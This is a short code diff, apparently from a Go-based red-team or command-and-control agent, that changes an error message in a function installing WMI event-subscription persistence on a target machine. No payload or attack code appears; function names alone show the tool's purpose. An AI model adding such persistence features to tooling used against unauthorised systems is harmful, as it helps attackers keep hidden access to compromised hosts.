@@ -97,7 +97,7 @@ func wmiPersistInstall(args wmiPersistArgs) structs.CommandResult {
 
 	wqlQuery, err := buildWQLTrigger(args.Trigger, args.IntervalSec, args.ProcessName)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("Error: failed to build WQL trigger for %q: %v", args.Trigger, err)
 	}
 
 	_, services, cleanup, err := wmiSubscriptionConnect(args.Target)
